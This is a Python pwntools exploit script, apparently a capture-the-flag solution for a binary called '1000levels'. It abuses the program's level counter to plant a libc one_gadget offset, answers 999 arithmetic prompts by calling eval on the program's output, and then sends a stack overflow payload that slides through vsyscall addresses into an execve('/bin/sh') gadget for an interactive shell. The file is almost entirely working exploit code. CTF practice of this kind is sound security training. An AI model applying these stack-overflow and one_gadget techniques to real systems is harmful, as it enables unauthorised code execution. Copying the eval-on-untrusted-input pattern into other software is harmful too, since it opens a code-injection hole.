#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import re
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./1000levels", env = {"LD_PRELOAD": "libc.so.6"})
libc = ELF("./libc.so.6")

def hint():
    io.sendlineafter(":\n", "2")

def go(levels, more):
    io.sendlineafter(":\n", "1")
    io.sendlineafter("?\n", str(levels))
    io.sendlineafter("?\n", str(more))

def answer():
    io.recvuntil(": ")
    ques = io.recvuntil(" =", drop = True)
    #  print ques
    ans = eval(ques)
    return str(ans)
    
def DEBUG(bps = []):
    cmd = ""
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    cmd += "c"
    gdb.attach(io, cmd)
 
if __name__ == "__main__":
    hint()
    '''
    0x4526a	execve("/bin/sh", rsp+0x30, environ)
    constraints:
    [rsp+0x30] == NULL
    '''
    one_gadget = 0x4526a
    go(0, one_gadget - libc.sym['system'])

    for i in xrange(999):
        success(i + 1)
        io.sendlineafter(":", answer() + '\0')

    '''
    0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
    '''
    #  pause()
    #  DEBUG([0xE2D])
    vsyscall = 0xffffffffff600000
    #  vsyscall = 0xffffffffff600400
    #  vsyscall = 0xffffffffff600800
    payload = (answer() + '\0').ljust(0x38, '\0') + p64(vsyscall) * 3
    io.sendafter(":", payload)

    io.interactive()
    io.close()
